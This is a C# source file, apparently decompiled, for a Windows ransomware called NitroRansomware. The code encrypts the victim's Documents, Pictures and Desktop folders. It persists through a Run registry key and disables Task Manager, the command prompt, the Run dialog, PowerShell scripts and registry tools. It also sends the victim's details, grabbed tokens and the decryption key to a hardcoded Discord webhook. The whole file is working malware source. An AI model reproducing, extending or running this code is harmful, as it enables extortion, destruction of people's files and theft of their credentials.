using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace NitroRansomware;

internal class Program
{
	private static string desktop = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);

	private static string documents = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

	private static string pictures = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);

	public static string WEBHOOK = "https://discord.com/api/webhooks/1000510003842650123/gYIQ9ziVpRioxVgEVraeLs272jHswO6-dZdpbXELsK6LrHF8JUzQL2IQoXMsTuz9JYQu";

	public static string DECRYPT_PASSWORD = "q9cBYcfzP9HWXK&TqGir4kNPWmBTj#!T$ak9Y88u5jstUsZamYAs5W#vs2d#7VJKK6zzk4*!&8o5G@g3n@mxQD$n2kxXDHXer$EBz@KcLa8ir3wrGAA$nsfef3BVV#NF";

	private static Logs logging = new Logs("DEBUG", 0);

	private static Webhook ww = new Webhook(WEBHOOK);

	private static void Main(string[] args)
	{
		if (Installed())
		{
			Disabler();
			Application.Run((Form)(object)new NitroRansomware());
		}
		else
		{
			StartUp();
			Application.Run((Form)(object)new NitroRansomware());
		}
	}

	private static void Setup()
	{
		logging.Debug("Setup start");
		List<string> list = Grabber.Grab();
		string text = "";
		foreach (string item in list)
		{
			text = text + item + "\n";
		}
		Console.WriteLine(text);
		User.GetDetails();
		User.GetIdentifier();
		User.GetIP();
		Webhook webhook = new Webhook(WEBHOOK);
		webhook.Send("**Program executed** ```Status: Active\nPC Name: \nUser: \nUUID: \nIP Address: ```");
		webhook.Send("```Decryption Key: " + DECRYPT_PASSWORD + "```");
		webhook.Send("```Tokens:\n```");
	}

	public static void Disabler()
	{
		string value = "1";
		string value2 = "0";
		string subkey = "SOFTWARE\\Policies\\Microsoft\\Windows\\System";
		string subkey2 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer";
		string subkey3 = "SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell";
		string subkey4 = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(subkey4);
		registryKey.SetValue("DisableTaskMgr", value);
		registryKey.Close();
		registryKey = Registry.CurrentUser.CreateSubKey(subkey);
		registryKey.SetValue("DisableCMD", value, RegistryValueKind.DWord);
		registryKey.Close();
		registryKey = Registry.CurrentUser.CreateSubKey(subkey2);
		registryKey.SetValue("NoRun", value, RegistryValueKind.DWord);
		registryKey.Close();
		registryKey = Registry.LocalMachine.CreateSubKey(subkey3);
		registryKey.SetValue("EnableScripts", value2, RegistryValueKind.DWord);
		registryKey.Close();
		try
		{
			registryKey = Registry.CurrentUser.CreateSubKey(subkey4);
			registryKey.SetValue("DisableRegistryTools", value, RegistryValueKind.DWord);
			registryKey.Close();
		}
		catch (Exception)
		{
		}
	}

	public static void EncryptAll()
	{
		ww.Send("```Starting file encryption...```");
		Thread thread = new Thread((ThreadStart)delegate
		{
			Crypto.EncryptContent(documents);
		});
		Thread thread2 = new Thread((ThreadStart)delegate
		{
			Crypto.EncryptContent(pictures);
		});
		Thread thread3 = new Thread((ThreadStart)delegate
		{
			Crypto.EncryptContent(desktop);
		});
		thread.Start();
		thread2.Start();
		thread3.Start();
		thread.Join();
		thread2.Join();
		thread3.Join();
		ww.Send($"```Finished encrypting victim's files. Total number of files encrypted: {Crypto.encryptedFileLog.Count}```");
		Wallpaper.ChangeWallpaper();
	}

	public static void DecryptAll()
	{
		Thread thread = new Thread((ThreadStart)delegate
		{
			Crypto.DecryptContent(documents);
		});
		Thread thread2 = new Thread((ThreadStart)delegate
		{
			Crypto.DecryptContent(pictures);
		});
		Thread thread3 = new Thread((ThreadStart)delegate
		{
			Crypto.DecryptContent(desktop);
		});
		thread.Start();
		thread2.Start();
		thread3.Start();
		thread.Join();
		thread2.Join();
		thread3.Join();
	}

	private static void StartUp()
	{
		try
		{
			string text = Process.GetCurrentProcess().ProcessName + ".exe";
			string text2 = Path.GetTempPath() + text;
			Console.WriteLine(text2);
			using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("NR", "\"" + text2 + "\"");
		}
		catch (Exception ex)
		{
			logging.Error(ex.Message);
		}
	}

	public static void RemoveStart()
	{
		if (Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", "NR", true) != null)
		{
			using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true))
			{
				registryKey.DeleteValue("NR", throwOnMissingValue: false);
			}
		}
	}

	private static void Duplicate()
	{
		try
		{
			string text = Process.GetCurrentProcess().ProcessName + ".exe";
			string sourceFileName = Path.Combine(Environment.CurrentDirectory, text);
			File.Copy(sourceFileName, Path.GetTempPath() + text);
			Console.WriteLine(Path.GetTempPath());
		}
		catch (Exception ex)
		{
			logging.Debug(ex.Message);
		}
	}

	private static bool Installed()
	{
		if (Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", "NR", null) != null)
		{
			return true;
		}
		return false;
	}

	private static void Temp()
	{
		string text = Path.GetTempPath() + "NR_decrypt.txt";
		Console.WriteLine(text);
		using StreamWriter streamWriter = new StreamWriter(text);
		streamWriter.WriteLine(DECRYPT_PASSWORD);
	}
}
